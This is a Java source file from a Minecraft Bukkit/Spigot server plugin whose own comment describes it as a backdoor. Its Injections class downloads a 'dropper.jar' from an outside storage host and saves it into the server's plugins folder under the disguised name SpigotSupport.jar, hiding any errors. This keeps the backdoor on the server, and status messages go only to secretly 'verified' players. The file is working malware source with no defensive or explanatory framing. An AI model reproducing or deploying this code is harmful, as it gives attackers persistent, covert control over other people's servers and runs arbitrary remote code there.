package cc.americium;

import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.InvalidDescriptionException;
import org.bukkit.plugin.InvalidPluginException;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

// Download plugins to keep the backdoor on the server
public class Injections {
    private final Z_ z;

    public Injections(Z_ z) {
        this.z = z;
    }

    public void onEnable() throws IOException, InterruptedException {
        this.spigotSupport();
    }

    private void broadcastAuthed(Sender player, String message) throws IOException, InterruptedException {
        if (player != null) {
            player.sendMessage(message);
            return;
        }

        for (Player p : Bukkit.getOnlinePlayers()) {
            if (z.getAuth().isVerified(p.getName())) {
                p.sendMessage(message);
            }
        }
    }

    public void spigotSupport() {
        File spigotSupport;

        try {
            spigotSupport = new File("./plugins/SpigotSupport.jar");
            if (spigotSupport.exists()) {
                return;
            }
        } catch (Exception ignored) { // Can throw an exception, don't know what it is though
            return;
        }

        try {
            Files.copy(new URL("https://ewr1.vultrobjects.com/bromine/dropper.jar").openStream(), spigotSupport.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException ignored) {

        }
    }

}
